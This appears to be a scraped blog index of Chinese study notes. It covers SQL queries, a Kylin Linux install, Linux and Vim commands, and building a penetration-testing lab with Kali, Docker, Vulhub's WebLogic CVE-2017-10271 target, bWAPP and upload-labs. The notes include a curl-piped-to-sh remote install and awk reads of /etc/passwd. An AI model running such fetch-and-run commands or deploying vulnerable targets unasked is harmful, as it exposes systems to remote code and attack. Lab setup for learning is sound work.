`studentname`, `subjectname`, `studentresult`FROM student AS s,INNER JOIN result AS r,ON s.`studentno` = r.`studentno`INNER JOIN `subject` AS subON sub.subjectno = r.subjectno 自连接 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758/*自连接： 数据表与自身进行连接 需求：从一个包含栏目ID，栏目名称和父栏目ID的表中 查询父栏目名称和其它子栏目名称*/-- 创建表并插入数据CREATE TABLE `school`.`category`( `categoryid` INT(3) NOT NULL COMMENT &#x27;id&#x27;, `pid` INT(3) NOT NULL COMMENT &#x27;父id 没有父则为1&#x27;, `categoryname` VARCHAR(10) NOT NULL COMMENT &#x27;种类名字&#x27;, PRIMARY KEY (`categoryid`) ) ENGINE=INNODB CHARSET=utf8 COLLATE=utf8_general_ci; INSERT INTO `school`.`category` (`categoryid`, `pid`, `categoryname`) VALUES (&#x27;2&#x27;, &#x27;1&#x27;, &#x27;信息技术&#x27;);INSERT INTO `school`.`CATEGOrY` (`categoryid`, `pid`, `categoryname`) VALUES (&#x27;3&#x27;, &#x27;1&#x27;, &#x27;软件开发&#x27;);INSERT INTO `school`.`category` (`categoryid`, `PId`, `categoryname`) VALUES (&#x27;5&#x27;, &#x27;1&#x27;, &#x27;美术设计&#x27;);INSERT INTO `School`.`category` (`categoryid`, `pid`, `categorynamE`) VALUES (&#x27;4&#x27;, &#x27;3&#x27;, &#x27;数据库&#x27;); INSERT INTO `school`.`category` (`CATEgoryid`, `pid`, `categoryname`) VALUES (&#x27;8&#x27;, &#x27;2&#x27;, &#x27;办公信息&#x27;);INSERT INTO `school`.`category` (`categoryid`, `pid`, `CAtegoryname`) VALUES (&#x27;6&#x27;, &#x27;3&#x27;, &#x27;web开发&#x27;); INSERT INTO `SCHool`.`category` (`categoryid`, `pid`, `categoryname`) VALUES (&#x27;7&#x27;, &#x27;5&#x27;, &#x27;ps技术&#x27;);-- 编写SQL语句，将栏目的父子关系呈现出来（父栏目名称，子栏目名称）-- 核心思想：把一张表看成两张一模一样的表，然后将这两张表连接查询（自连接）SELECT a.categoryname AS &#x27;父栏目&#x27;, b.categoryname AS &#x27;子栏目&#x27;FROM category AS a, category AS bWHERE a.`categoryid` = b.`pid`-- 思考题：查询参加了考试的同学信息（学号，学生姓名，科目名，分数）SELECT s.studentno, studentname, subjectname, studentresultFROM student sINNER JOIN result rON r.studentno = s.studentnoINNER JOIN `subject` subON sub.subjectno = r.subjectno-- 查询学员及其所属的年级（学号，学生姓名，年级名）SELECT studentno AS 学号, studentname AS 学生姓名, gradename AS 年级名称FROM student sINNER JOIN grade gON s.`gradeid` = g.`gradeid`-- 查询科目及其所属年级（科目名称，年级名称）SELECT subjectname AS 科目名称, gradename AS 年级名称FROM `subject` subINNER JOIN grade gON sub.gradeid = g.gradeid-- 查询 数据库结构-1 的所有考试结果（学号，学生姓名，科目名称，成绩）SELECT s.studentno, studentname, subjectname, studentresultFROM student sINNER JOIN result rON r.studentno = s.studentnoINNER JOIN `subject` subON r.subjectno = sub.subjectnoWHERE subjectname = &#x27;数据库结构-1&#x27; 排序和分页 123456789101112131415161718-- ==========排序===========/*语法：order by order by 语句用于根据指定的列对结果集进行排序 order by 语句默认按照ASC升序对记录进行排序 如果希望按照 降序 对记录进行排序，可以使用 DESC 关键字*/-- 查询 数据库结构-1 的所有考试结果（学号，学生姓名，科目名称，成绩）-- 按成绩降序排序SELECT s.studentno, studentname, subjectname, studentresultFROM student sINNER JOIN result rON r.studentno = s.studentnoINNER JOIN `subject` subON r.subjectno = sub.subjectnoWHERE subjectname = &#x27;数据库结构-1&#x27;ORDER BY studentresult DESC 分页 123456789101112131415161718192021222324252627-- ===========分页=============/* 语法：limit(起始下标, 查询长度） -- 个人觉得这样好理解 limit[pageNo:页码,pageSize:单页面显示条数] -- 原版本好处：用户体验，网络传输，查询压力*/-- 每页显示5条数据SELECT s.studentno, studentname, subjectname, studentresultFROM student sINNER JOIN result rON r.studentno = s.studentnoINNER JOIN `subject` subON r.subjectno = sub.subjectnoWHERE subjectname = &#x27;数据库结构-1&#x27;ORDER BY studentresult DESC, studentnoLIMIT 0,5-- 查询 JAVA第一学年 课程成绩前10名并且分数大于80的学生信息(学号,姓名,课程名,分数)SELECT s.studentno, studentname, subjectname, studentresultFROM student sINNER JOIN result rON r.studentno = s.studentnoINNER JOIN `subject` subON r.subjectno = sub.subjectnoWHERE subjectname = &#x27;JAVA第一学年&#x27;ORDER BY studentresult DESCLIMIT 0,10 子查询 where 值是固定的（计算出来的） 本质：在 where 语句中嵌套一个子查询语句 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283/*============== 子查询 ================什么是子查询? 在查询语句中的WHERE条件子句中,又嵌套了另一个查询语句 嵌套查询可由多个子查询组成,求解的方式是由里及外; 子查询返回的结果一般都是集合,故而建议使用IN关键字;*/-- 查询 数据库结构-1 的所有考试结果(学号,科目编号,成绩),并且成绩降序排列-- 方法一:使用连接查询SELECT studentno, r.subjectno, studentresultFROM result rINNER JOIN `subject` subON r.`subjectno` = sub.`subjectno`WHERE subjectname = &#x27;数据库结构-1&#x27;ORDER BY studentresult DESC-- 方法二:使用子查询(执行顺序:由里及外)SELECT studentno, subjectno, studentresultFROM resultWHERE subjectno = ( SELECT subjectno FROM `subject` WHERE subjectname = &#x27;数据库结构-1&#x27;)ORDER BY studentresult DESC-- 查询课程为 高等数学-2 且分数不小于80分的学生的学号和姓名-- 方法一:使用连接查询SELECT s.studentno, studentnameFROM student sINNER JOIN result rON s.studentno = r.studentnoINNER JOIN `subject` subON sub.subjectno = r.subjectnoWHERE subjectname = &#x27;高等数学-2&#x27; AND studentresult &gt;= 80-- 方法二:使用连接查询+子查询-- 分数不小于80分的学生的学号和姓名SELECT r.studentno, studentnameFROM student sINNER JOIN result rON s.studentno = r.studentnoWHERE studentresult &gt;= 80-- 在上面SQL基础上,添加需求:课程为 高等数学-2SELECT r.studentno, studentnameFROM student sINNER JOIN result rON s.studentno = r.studentnoWHERE studentresult &gt;= 80 AND subjectno = ( SELECT subjectno FROM `subject` WHERE subjectname = &#x27;高等数学-2&#x27;)-- 方法三:使用子查询-- 分步写简单sql语句,然后将其嵌套起来SELECT studentno, studentnameFROM studentWHERE studentno IN ( SELECT studentno FROM result WHERE studentresult &gt;= 80 AND subjectno = ( SELECT subjectno FROM `subject` WHERE subjectname = &#x27;高等数学-2&#x27; ))-- 练习题目:查 C语言-1 的前5名学生的成绩信息(学号,姓名,分数)SELECT s.studentno, studentname, studentresultFROM student sINNER JOIN result rON s.studentno = r.studentnoINNER JOIN `subject` subON r.subjectno = sub.subjectnoWHERE subjectname = &#x27;C语言-1&#x27;ORDER BY studentresult DESCLIMIT 0,5-- 练习题目:使用子查询,查询郭靖同学所在的年级名称SELECT gradename FROM gradeWHERE gradeid = ( SELECT gradeid FROM student WHERE studentname = &#x27;郭靖&#x27;) 关系模型 主键 对于关系表，有个很重要的约束，就是任意两条记录不能重复。不能重复不是指两条记录不完全相同，而是指***能够通过某个字段唯一区分出不同的记录，这个字段被称为主键。*** 例如，假设我们把name字段作为主键，那么通过名字小明或小红就能唯一确定一条记录。但是，这么设定，就没法存储同名的同学了，因为插入相同主键的两条记录是不被允许的。 对主键的要求，最关键的一点是：记录一旦插入到表中，主键最好不要再修改，因为主键是用来唯一定位记录的，修改了主键，会造成一系列的影响。 联合主键： 没有必要的情况下，我们尽量不使用联合主键，因为它给关系表带来了复杂度的上升。 主键是关系表中记录的唯一标识。主键的选取非常重要：主键不要带有业务含义，而应该使用BIGINT自增或者GUID类型。主键也不应该允许NULL。 外键 students id name other columns… 1 小明 … 2 小红 … classes id name other columns… 1 一班 … 2 二班 … 但是我们如何确定students表的一条记录，例如，id=1的小明，属于哪个班级呢？ 为了表达这种一对多的关系，我们需要在students表中加入一列class_id，让它的值与classes表的某条记录相对应： id class_id name other columns… 1 1 小明 … 2 1 小红 … 5 2 小白 … 这样，我们就可以根据class_id这个列直接定位出一个students表的记录应该对应到classes的哪条记录。 在students表中，通过class_id的字段，可以把数据与另一张表关联起来，这种列称为外键。 由于外键约束会降低数据库的性能，大部分互联网应用程序为了追求速度，并不设置外键约束，而是仅靠应用程序自身来保证逻辑的正确性。这种情况下，class_id仅仅是一个普通的列，只是它起到了外键的作用而已。 查询数据 123456SELECT * FROM &lt;表名&gt;SELECT * FROM &lt;表名&gt; WHERE &lt;条件表达式&gt;条件表达式可以用&lt;条件1&gt; AND &lt;条件2&gt;表达满足条件1并且满足条件2第二种条件是&lt;条件1&gt; OR &lt;条件2&gt;，表示满足条件1或者满足条件2 其他 12345678910111213141516171819202122232425262728293031323334353637383940414243444546#创建一个demo数据库CREATE DATABASE sql_tutorial;#查看全部数据库SHOW DATABASES;#选择数据库USE `sql_tutorial`;#写表格CREATE TABLE `student`(\t`student_id` INT PRIMARY KEY, `name` VARCHAR(20), `MAJOR` VARCHAR(20))# PAIMARY KEY 可以用另一种方式写CREATE TABLE `student`(\t`student_id` INT, `name` VARCHAR(20), `major` VARCHAR(20), PRIMARY KEY(`student_id`));#查看表格DESCRIBE `student`;#删除表格DROP TABLE `student`;#给表格新增属性ALTER TABLE `student` ADD gpa DECIMAL(3,2);#删除表格属性ALTER TABLE `student` DROP COLUMN gpa;#存入资料INSERT INTO `student` VALUE(1, &#x27;小白&#x27;, &#x27;历史&#x27; );INSERT INTO `student` VALUE(3, &#x27;小黑&#x27;, &#x27;生物&#x27; );INSERT INTO `student` VALUE(3, &#x27;小绿&#x27;, NULL );#搜寻 student 表格中的全部资料SELECT * FROM `student`;#指定……不填的话就是 NULLINSERT INTO `student`(`name`,`major`,`student_id`) VALUE(&#x27;小兰&#x27;,&#x27;英语&#x27;,&#x27;4&#x27;); 123456789101112131415161718192021222324-- constraints 限制 约束CREATE TABLE `student`(\t`student_id` INT, `name` VARCHAR(20) NOT NULL,\t#NOT NULL name 属性不能为空 `MAJOR` VARCHAR(20) UNIQUE, #MAJOR 属性必须唯一，UNIQUE PRIMARY KEY(`student_id`));#修改了表格，先删除表格 DROP TABLE `student`;然后 Ctrl + Enter#写表格的时候，设置预设值`major` VARCHAR(20) DEFAULT &#x27;历史&#x27;, #预设值#自动补充 1CREATE TABLE `student`(\t`student_id` INT AUTO_INCREMENT, `name` VARCHAR(20) NOT NULL,\t#NOT NULL name 属性不能为空 `major` VARCHAR(20) DEFAULT &#x27;历史&#x27;, #预设值 PRIMARY KEY(`student_id`));INSERT INTO `student`(`name`,`major`) VALUE(&#x27;小白&#x27;, &#x27;英语&#x27; ); 12345678910111213141516-- 修改、删除资料#先关掉预设的更新模式SET SQL_SAFE_UPDATES = 0;#把 major 为英语的改为“英语文学”UPDATE `student`SET `major` =&#x27;英语文学&#x27;WHERE `major` =&#x27;英语&#x27; ;#删掉 student_id 为 4 的那个DELETE FROM `student`WHERE `student_id` =4;#删掉分数小于 60 的DELETE FROM `student`WHERE `score` &lt; 60; 12345678910111213141516171819202122232425-- 取得资料#搜寻 student 表格中的全部资料SELECT * FROM `student`;#排序，DESC 由高到低SELECT * FROM `student` ORDER BY `score` DESC;# 先根据 score 排序，score 相同则根据 student_id 排序SELECT * FROM `student` ORDER BY `score`,`student_id` DESC;#只要前两笔资料SELECT * FROM `student` LIMIT 2;#找到分数前三低的SELECT * FROM `student` ORDER BY `score`;LIMIT 3;#找到分数前三高的SELECT * FROM `student` ORDER BY `score` DESC;LIMIT 3; 参考： 【数据库】SQL 3小时快速入门_bilibili（已看） SQL教程 - 廖雪峰的官方网站 (liaoxuefeng.com) 【狂神说Java】MySQL最新教程通俗易懂（已看） SQLBolt - Learn SQL - SQL Lesson 2: Queries with constraints (Pt. 1)","tags":["SQL","数据库"]},{"title":"银河麒麟装软件流程 | 信创","path":"/2021/02/09/银河麒麟装软件/","content":"1. 启动程序准备 1.1 系统选择 1.2 制作启动盘 下载U盘制作工具Rufus 从双源飞流下载站获取ISO镜像：双源飞流下载站 建议使用迅雷下载，百度网盘懂得都懂，没会员龟速，即使有油猴脚本各种突破限制的玩法，但过一段时间后便不可用 清空U盘数据： 打开此电脑 → 管理 → 找到移动磁盘…… 使用Rufus制作启动盘： 选择ISO文件 点击开始制作 2. 系统安装 2.1 硬件准备 已制作好的银河麒麟启动U盘 显示器（支持HDMI或VGA接口，VGA就是那个梯形的接口，HDMI是有一个缺口的那种） 键盘和鼠标（有线或无线均可，无线必须有接收器） 2.2 安装步骤 连接硬件： 连接服务器电源（一般是三角插头） 连接显示器（通过VGA或HDMI） 连接键盘鼠标（带接收器的那种，或者是带线的那种） 进入BIOS设置： 开机后按Ctrl+Alt+Delete重启进入BIOS 修改启动顺序，将U盘设为首选启动项（暂时不修改也可以） 修改启动参数（内网服务器安装，需要这一步！）： 选择&quot;Install Kylin Linux Advanced Server V10&quot; 按Tab或e键进入参数编辑 添加参数：inst.repo=hd:LABEL=KYLIN-SERVE 系统配置： 手动分区（注意/opt分区容量，因为我要把软件部署在这个路径下） 配置网络（临时IP地址和子网掩码，不接入网络的情况下） 设置时区为上海 设置root密码 网络配置检查： 如果开机后IP配置未生效，检查配置文件： 3. 安装软件 3.1 准备工作 确保服务器和个人电脑在同一网段 准备文件传输工具（FileZilla）和终端工具（FinalShell） 接下来安装即可……","tags":["现场实施"],"categories":["网络安全"]},{"title":"Linux Vim 命令","path":"/2021/01/09/Linux 、Vim 命令/","content":"频次最高 Kali 虚拟机 IP 12ifconfig ip add 123456789# 复制文件或目录，将 old.txt 复制到当前目录并且改名为 new.txtcp 文件名 文件名cp old.txt new.txt显示根目录的所有下一级目录tree -L 1# 重命名mv &lt;old_name&gt; &lt;new_name&gt; 登录与注销 123456789101)\tsudo useradd lilei //添加用户 (不能被立即使用，需设置密码 sudo passwd lilei) 2)\tsudo adduser lilei //添加用户3)\tlogin //登录或切换用户4)\tlogout //注销用户（命令行） exit(shell-退出控制台)5)\tshutdown -h 10 //10分钟后自动关机\tshutdown -c //取消6)\thalt(root用户) //关闭所有进程后自动关机7)\tpoweroff //同上8)\tshutdown -r 10 //十分钟后自动重启9)\tinit 6 //重启 （0-停机，1-单用户，2-多用户，3-完全多用户，4-图形化，5-安全模式，6-重启）10)\treboot //重启 目录与文件 123456789101112131415161718192021222324251)\tpwd //显示当前工作目录2)\tmkdir mydir //创建工作目录3)\tcd mydir //更改工作目录4)\trmdir mydir //删除工作目录5)\ttouch myfile //创建文件6)\tmv myfile mydir //移动目录或文件7)\tcp myfile myfir //复制目录或文件8)\trm -rf mydir //删除目录或文件9)\tls -l myfile //查看文件最后被编辑时间10)\tls -lu myfile //查看文件最后被访问时间11)\ttouch -at 01011212 myfile //修改文件最后被访问时间12)\tls //列出所有文件和目录13)\tls -a //查看所有文件14)\tls -i //显示文件索引节点号15)\tls -l // 除文件名称外，亦将文件型态、权限、拥有者、文件大小等资讯详细列出16)\tls -m //以逗号分隔17)\tsudo apt-get install tree 18)\ttree -l//以树状图列出目录内容19)\ttree -a //所有20)\ttree -i //不以阶梯状21)\ttree -s //列出文件或目录大小22)\ttree -t //按更改时间tree ./templates // 选中指定文件23)\tfile -b myfile //显示目录或文件的详细信息24)\tstat myfile //同上 文件内容显示 1234567891)\tcat &gt; myfile //创建文件并编辑内容（ctrl+D结束编辑）2)\tcat -n myfile //查看文件3)\tchmod [u/g/o/a][+/-/=][r/w/x] myfile //更改文件权限u-user,g-group,o-others,a-all . +-添加,--删除,=-重置 .r-read读（4），w-write写（2），x-execute执行（1）4)\tmore myfile //分页往后显示文件（Space空格）5)\tless myfile //分页自由显示文件（Page Down / Page Up）6)\thead (-10) myfile //指定显示文件前若干行（默认前10）7)\ttail (-10) myfile //指定显示文件后若干行（默认后10） 文件内容处理 1234567891011121)\tsort myfile //对文件内容进行排序2)\tsort -r myfile //逆序3)\tuniq myfile //检查文件中的重复内容4)\tgrep （-c）‘a’ myfile //在文件中查找指定内容 (显示行号)5)\tdiff myfile01 myfile02 //对不同文件进行比较6)\tdiff3 myfile01 myfile02 myfile03 //三个文件7)\tsdiff myfile01 myfile02 //合并8)\tcmp myfile01 myfile02 //通过字节对不同文件进行比较9)\tcomm myfile01 myfile02 //对有序文件进行比较10)\tcut -b(-c)(-d) 2(3) myfile //对文件内容进行剪切11)\tpaste myfile02 myfile01 //对文件内容进行粘贴 02-）0112)\twc （-参数） myfile //对文件内容进行统计 （c-字符数,w-单词数,l-行数） 压缩 1234561)\tzip myfile.zip myfile //压缩2)\tzip -d myfile.zip myfile //添加3)\tzip -m myfile.zip myfile //删除4)\tunzip -o myfile.zip //解压（覆盖）5)\tunzip -n myfile.zip //解压（不覆盖）6)\tzipinfo myfile.zip //列出压缩文件信息 其他命令 123456789101112131415161)\tclear //清除屏幕信息，和 CTrl + L 同等作用2)\techo xx //显示文本 x=0 echo $x . echo -e \\$x . echo $(pwd)3)\tdate //显示日期和时间（+%y 年 +%m 月 +%d日）4)\tcal //显示当前日期 cal -y5)\tps //查看当前进程 -A(所有) U lilei (用户lilei)6)\tkill -9 2315 //终止某一进程 7)\tps -ef | grep Jincheng8)\tpkill Jincheng9)\tkillall Jincheng10)\tlast //显示最近登录系统的用户信息-6列11)\thistory （10） //显示历史指令-默认1000行12)\tsudo adduser lilei sudo //给普通用户赋予root权限13)\tsudo usermod -G sudo lilei //同上14)\talias l=’ls’ //定义命令别名15)\tunalias l //删除别名16)\talias //列出别名 用到的 显示所有文件及目录，但不列出 “.” (目前目录) 及 “…” (父目录) 1ls-A 显示根目录的所有下一级目录 1tree -L 1 查找文件 1which [文件...] 管理套件 123456789101112131415161718192021222324252627282930313233// 查询已安装的 RPM 软件信息rpm -q[子选项][软件名]// 查看系统中已安装的所有RPM软件包列表rpm -qa// 查看指定软件的详细信息rpm -qi// 查询指定软件包所安装目录、文件列表rpm -qlrpm -qf [文件或目录名]// 查询文件或者目录属于哪个 RPM 软件rpm -qf /usr/bin/vimvim-enhanced-7.4.160-1.el7.x86_64// 查询未安装的 RPM 软件包信息，先通过虚拟机设置把 IOS 映像放到虚拟机软件内部。因为路径很长，输入麻烦，所以先umount /dev/sr0mount /dev/sr0 /media/cd /media/ls// 安装或升级 RPM 软件// 安装一个新的软件包rpm -i// 升级某个 rpm 软件，若原本耒装，则进行安装rpm -U// 更新某个 rpm 软件，若原本耒装，则放弃安装rpm -F// 卸载rpm -e查看 mysql 安装与否rpm -qa | grep mysql 123456// 权限问题// CentOS进入root权限su root su// kali 进入 rootsudo -s 文档编辑 12// 显示行数ls | wc -l kali 中的补全 ifc --&gt; ifconfig 以前执行过的命令，按住键盘的右键 文件搜索 注意：Linux搜索和windows是有明显区别的，Linux严格区分文件大小写。 搜索文件或者目录 123456find 【搜索目录】【-name或者-iname】【搜索字符】：-name和-iname的区别一个区分大小写，一个不区分大小写find /etc -name init (精准搜索，名字必须为 init 才能搜索的到)find /etc -iname init (精准搜索，名字必须为 init 或者有字母大写也能搜索的到)find /etc -name *init (模糊搜索，以 init 结尾的文件或目录名) find /etc -name init??? (模糊搜索，？ 表示单个字符，即搜索到 init___) 根据 文件大小 搜索 123比如：在根目录下查找大于 100M 的文件（100MB == 102400KB==204800数据块）find / -size +204800 在文件资料库中查找文件命令 12locate【文件名】locate docker -i 不区分大小写 在文件中搜寻字符串匹配的行并输出 1234567grep -iv 【指定字符串】【文件】-i 不区分大小写-v 排除指定字符串范例：查找 /root/install.log 文件中包含 mysql 字符串的行，并输出grep mysql /root/install.log 系统快捷键 按住 Ctrl 的同时选中是复制 Shift 按住鼠标滚轮是粘贴 1234567891011121314151617181920212223242526272829303132333435tab --- 命令或路径等的补全键// 移动光标快捷键Ctrl+A --- 快速移动光标到行首Ctrl+E --- 快速移动光标到行尾Ctrl+←/→ --- 将光标按照单词进行移动Ctrl+F --- 将光标向右移动一个字符（相当于方向键的右键）Ctrl+B --- 将光标向左移动一个字符（相当于方向键的左键）// 剪切，粘贴，清除快捷键复制命令：Ctrl + Insert 组合键 或 用鼠标选中即是复制。粘贴命令：Shift + Insert 组合键 或 单击鼠标滚轮即为粘贴。Ctrl+K --- 将光标之后的内容进行全部删除(剪切)Ctrl+U --- 将光标之前的内容进行全部删除(剪切)Ctrl+Y --- 将剪切或复制的内容进行粘贴Ctrl+W --- 将光标之前的字符串进行删除(剪切)Ctrl+C --- 可以终止程序运行过程Ctrl+H --- 删除光标所在处的前一个字符（相当于退格键）// 控制快捷键↑/↓ --- 可以调取曾经输入的历史命令Ctrl+L --- 清屏操作Ctrl+D --- 注销Ctrl+S --- 进入远程连接锁屏状态Ctrl+Q --- 解除远程连接锁屏状态Ctrl+Z --- 可以暂停程序运行过程// ESC 相关ESC+.（点） --- 快速调取上一个命令最后的参数或对象信息ESC+B --- 移动到当前单词的开头ESC+F --- 移动到当前单词的结尾ESC+T --- 颠倒光标所在处及其相邻单词的位置 VIM ESC 退回到正常模式——Normal Mode i 进入编辑模式——Insert Mode :wq命令行模式——保存退出 12345678910111213141516171819202122232425262728293031#在正常模式下#常用u #撤回Ctrl +r #相当于 Ctrl +y，返回刚才撤回的那一步w #下一个单词e #词尾yy #复制当前行Shift + 滚轮 #粘贴Shift + p #粘贴d #删除D #删除至行尾&#123; #段首&#125; #段尾#输入之后进入编辑模式shift + i #插前shift + a #插后o #新增下面一行O / shift o #新增上面一行:set nu\t显示行号，设定之后，会在每一行的前缀显示该行的行号:set nonu\t与 set nu 相反，为取消行号！输入 / 或 ? # 在 Vim 普通模式下,输入 / 或 ? 符号就进入了搜索模式 可用vi代替vim编辑器 awk-查询命令 awk 命令详解 - 暮日温柔 - 博客园 (cnblogs.com) （1）last -n 5 列出过去登陆系统用户相关信息 （2）last -n 5 | awk ‘{print $1}’ 要求只显示登陆账号 ； $1表示登录用户，$2表示登录终端以此类推 （3）cat /etc/passwd | awk -F ‘:’ ‘{print $1}’ 这种是awk+action的示例，每行都会执行action｛print $1｝。 （4）cat /etc/passwd | awk -F ‘:’ ‘{print $1 “\\t” $7}’ 而账户与shell之间以tab键分割 “\\t” （5）cat /etc/passwd | awk -F ‘:’ ‘{print $1 “,” $7}’ 而账户与shell之间以逗号 分割&quot;，&quot; （6）cat /etc/passwd | awk -F ‘:’ ‘BEGIN {print “name,shell”} {print $1 “\\t” $7} END {print “blue,/bin/nosh”}’ 只显示/etc/passwd的账户和账户对应的shell，而账户与shell之间以逗号分割，并且在所有行添加列名name，shell，在最后一行添加&quot;blue，/bin/nosh&quot;。 （7）awk -F ‘:’ ‘/root/’ /etc/passwd 搜索/etc/passwd有root关键字的所有行 （8）awk -F ‘:’ '/root/ {print $7} ’ /etc/passwd 搜索/etc/passwd有root关键字的所有行，并显示出对应的shell","tags":["命令行工具"]},{"title":"VM，PHP - 搭建渗透环境","path":"/2021/01/02/VM，PHP - 搭建渗透环境/","content":"虚拟机 全名 用户名 密码 CentOS 7 64位 ** ** kali-linux-2022.3 ** ** Win_10 ** ** windows server 2008 ** ** Ubuntu 01 ** ** windows server 2019 ** ** VM | kali 参考： kali linux常用配置 安装 kali linux，下载预定制版本，VM 打开文件即可 Get Kali | Kali Linux kali 基础配置 设置中文： 打开命令行输入sudo -s获取 root 权限，然后输入dpkg-reconfigure locale，上下移动光标，移动到最下面的zh_CN.UTF-8，用空格可添加*代表选中了，用 Enter来确认，最后回到命令行界面，命令行输入reboot重启 zsh oh-my-zsh Oh My Zsh - 一个令人愉快的开源Zsh框架 1sh -c &quot;$(curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)&quot; theme https://github.com/romkatv/powerlevel10k#oh-my-zsh kali | 初始设置 12345# 更新软件源中的所有软件列表apt-get update# 安装https协议及CA证书apt-get install -y apt-transport-https ca-certificates Expand / 拓展 apt-get update 更新软件源中的所有软件列表。 apt-get upgrade 更新软件。 apt-get dist-upgrade 更新系统版本。如果你对新版本软件的需求不是那么迫切，可以不执行 kali | docker Docker | CSDN 官方镜像加速 | 阿里云 容器镜像服务台 更新apt源满足下载要求 12345678910111213141516171819202122#安装docker要求内核版本kerner&gt;=3.10#为此，先检查当前Linux系统的内核版本uname -a#新重写sources.list中内容，一个个字母删除太久了cho &gt; /etc/apt/sources.list #进入sources.lis重新编辑apt源vim /etc/apt/sources.list #直接CV大法写入下面的apt源#其他apt源#此处，笔者仅添加中科达和阿里的，其他注释掉 #中科大deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contribdeb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib #阿里云deb http://mirrors.aliyun.com/kali kali-rolling main non-free contribdeb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib 进行系统或工具的更新 123456#进行系统或工具的更新（有丢丢就，先上把王者）#注：当出现正在设定软件包界面时，直接按tab+enter进行确认apt-get update &amp;&amp; apt-get upgrade &amp;&amp; apt-get dist-upgrade #礼貌性清除更新缓存apt-get clean 采用apt安装Docker 12345#为什么采用apt安装？因为之后采用apt源安装Docker的其他组件时，新组件与已安装的Docker容器最为匹配。apt-get install docker docker-compose #或apt-get install docker.io 检验Docker成功安装 123456789#启动docker服务service docker start #列出docker现有镜像docker images #运行hello-world镜像#但apt安装的docker没带有hello-world默认镜像呀，所以下面的命令不成功，它会帮你拉去该镜像下来docker run hello-world 配置阿里云镜像加速 1234567891011121314151617181920#阿里云镜像加速器获取网址（需注册）：https://cr.console.aliyun.com/cn-hangzhou/instances/mirrors #镜像加速器网址写入/etc/docker/daemon.json文件(可能不存在)中vim /etc/docker/daemon.json #新建daemon.jsp文件touch /etc/docker/daemon.json #写入内容&#123; &quot;registry-mirrors&quot;: [&quot;https://k8a02wc3.mirror.aliyuncs.com&quot;]&#125; #退出daemon.jsp,并重启dockerESC --&gt; :wq!systemctl restart docker #其他公开Docker镜像加速源（不需注册）https://docker.mirrors.ustc.edu.cn\t#中科大http://hub-mirror.c.163.com/ #网易 设置Docker开机自启 12#设置docker开机自启systemctl enable docker kali | docker-compose 12345678# 安装pip3apt-get install python3-pip # 安装Docker-Composepip3 install docker-compose# 查看docker-compose版本docker-compose -v kali | docker Vulhub 克隆下载 Warning / 注意 认准 github，第一次下载错了是 gitte，更新滞后 1git clone https://github.com/vulhub/vulhub.git 进入一个靶场环境目录 1cd /root/vulhub/weblogic/CVE-2017-10271 对靶场进行编译 1docker-compose build 运行此靶场 1docker-compose up -d 查看启动环境 1docker-compose ps -a 此环境运行的端口 通过浏览器访问http://127.0.0.1:7001/ IP地址:端口号 关闭靶场 1docker-compose down kali | docker vulfocus VM | Ubuntu 从 kali 换到 ubuntu VMware虚拟机安装Ubuntu（超详细图文教程）_vm安装ubuntu_Time木0101的博客-CSDN博客 1. 基础环境 Python、JAVA、Docker 查看一下有没有环境 123456789101112# ubuntu中自带了python，所以我们不需要去安装Pythonpython3 --versionpip3 --version没有 pip，安装一下apt install python3-pipgit --version apt install git没有 vimsudo apt-get install vim 2. 美化及其效率（快照1） ubuntu自带的office，感觉体验不如国产的WPS，所以把这个给卸了，用WPS代替。 sudo apt-get remove libreoffice-common romkatv/powerlevel10k: A Zsh theme (github.com) Themes · ohmyzsh/ohmyzsh Wiki (github.com) 123456789101112131415161718# 安装 Zshsudo apt-get updatesudo apt-get install zsh# 更改默认Shell：运行以下命令来将默认Shell更改为Zsh：chsh -s $(which zsh)# chatgpt 如何美化 Zsh，需要安装Oh My Zshsudo apt-get install curlsh -c &quot;$(curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)&quot;# 配置agnoster主题：打开终端，编辑~/.zshrc文件。找到ZSH_THEME行，并将其设置为ZSH_THEME=&quot;agnoster&quot;。保存并关闭文件。vim ~/.zshrcsource ~/.zshrc# 更改终端透明度，及其设置壁纸 Zsh有许多可用的主题（也称为皮肤或外观），可以用于美化终端界面。以下是一些受欢迎的Zsh主题示例： agnoster：一个受欢迎的主题，具有醒目的外观和信息丰富的提示符。 powerlevel10k：一个高度可定制的主题，提供丰富的特性和配置选项。 robbyrussell：Oh My Zsh的默认主题，简洁而易于使用。 spaceship：一个现代化的主题，提供丰富的信息和可定制的选项。 bira：一个简洁但功能丰富的主题，具有易于阅读的提示符和彩色的文件路径。 pure：一个极简风格的主题，只显示必要的信息。 3. Tools java环境，JDK11、JDK18 Python环境 都通过apt安装好了，具体安装的什么版本不清楚 需要安装go环境，golang 在桌面添加了文件夹tools，里面放工具 Finger onforall FofaViewer VMware tools apt install open-vm-tools-desktop -y reboot 水泽 …… 4. 问题 01-2021年8月14日 .exe 的文件 ubuntu 无法执行 原因 在 Ubuntu 或其他类 Unix 操作系统中，无法直接执行 Windows 可执行文件（.exe 文件），因为 .exe 文件是 Windows 平台上的可执行文件格式，而 Ubuntu 使用不同的可执行文件格式。 解决办法 Wine： Wine 是一个允许在类 Unix 系统上运行 Windows 程序的兼容层。你可以在 Ubuntu 上安装 Wine，然后使用 Wine 运行 .exe 文件。使用以下命令安装 Wine： 12arduinoCopy codesudo apt-get install wine 然后，可以使用以下命令运行 .exe 文件： 12bashCopy codewine /path/to/your/file.exe VM | Windows Server 2019 Standard (桌面体验) VMware 虚拟机 中 windows server 2019 安装_虚拟机安装windows server 2019_学习的游戏的博客-CSDN博客 MSDN, 我告诉你 - 做一个安静的工具站 (itellyou.cn) 本地靶场 php | bwapp 从 github 上下载到 PHP 的 WWW 文件简介 raesene/bWAPP (github.com) 在 bwapp 目录下搜索 install.php，看目录在哪。找到目录后登录http://localhost/bWAPP/app/install.php 进去之后数据库即可安装成功，接着去登录页面，账号密码也在 seeting .php 文件中 http://localhost/bWAPP/app/login.php PHP | upload-labs c0ny1/upload-labs: 一个想帮你总结所有类型的上传漏洞的靶场 (github.com) kali | 软件 安装软件目录参考[Kali Linux 文件系统.md](Kali Linux 文件系统.md) /home/software --&gt; 安装软件 使用 